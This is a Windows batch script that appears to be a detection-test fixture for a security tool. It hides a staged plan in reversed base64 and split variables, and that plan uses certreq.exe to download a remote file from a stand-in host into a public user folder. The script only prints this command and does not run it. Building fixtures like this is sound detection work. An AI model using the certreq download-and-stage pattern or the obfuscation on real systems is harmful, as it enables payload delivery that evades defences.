@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|reverse
rem HUNTRESS-MATERIAL:dGFkLmM4Mzg4NTMyNjgtZWdhdHNcYmFMc3NlcnRudUhcY2lsYnVQXHNyZXNVXDpDPWh0YXBfZWxpZnx0YWQuMjJmNjBmZWIvZGlsYXZuaS5lbHBtYXhlLmM4Mzg4NTMyNjgvLzpzcHR0aD1scnV8YzgzODg1MzI2OC1uZ2lhcG1hYz1kaV9uZ2lhcG1hY3xlbm9uPWVnYXVnbmFsX3R4ZW58ZWdhdWduYWxfc3NvcmM9aHBhcmd8MT10bnVvY19lZ2F0c3xleGUucWVydHJlYz1yZXRwYWRhfGVsaWZfZXRpcncsZXRvbWVyX2VyaXVxY2E9c3BldHN8MT12
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "v_a0=v=1|steps=acquire_remote,write_file|adapter=certreq.exe|stage_c"
set "v_a1=ount=1|graph=cross_language|next_language=none|campaign_id=camp"
set "v_a2=aign-862358838c|url=https://862358838c.example.invalid/bef06f22"
set "v_a3=.dat|file_path=C:\Users\Public\HuntressLab\stage-862358838c.dat"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=3e2d56d6"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "cfg=!v_a0!!v_a1!!v_a2!!v_a3!"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo certreq.exe acquire https://862358838c.example.invalid/bef06f22.dat to C:\Users\Public\HuntressLab\stage-862358838c.dat
exit /b 0
